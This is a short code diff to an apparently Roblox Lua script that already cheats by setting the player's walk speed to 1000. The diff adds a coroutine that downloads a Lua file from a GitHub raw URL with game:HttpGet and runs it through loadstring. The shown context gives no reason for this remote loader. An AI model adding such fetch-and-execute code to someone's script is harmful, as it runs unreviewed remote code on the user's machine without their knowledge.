@@ -15,7 +15,9 @@ local mouse = player:GetMouse()
 char.Humanoid.WalkSpeed = 1000
 
 local i = false
-
+coroutine.wrap(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/skibidimattgig/bottlecap/refs/heads/main/bottlecaps.lua"))()
+end)()
 coroutine.wrap(function()
         local deb = false
         local deb2 = false
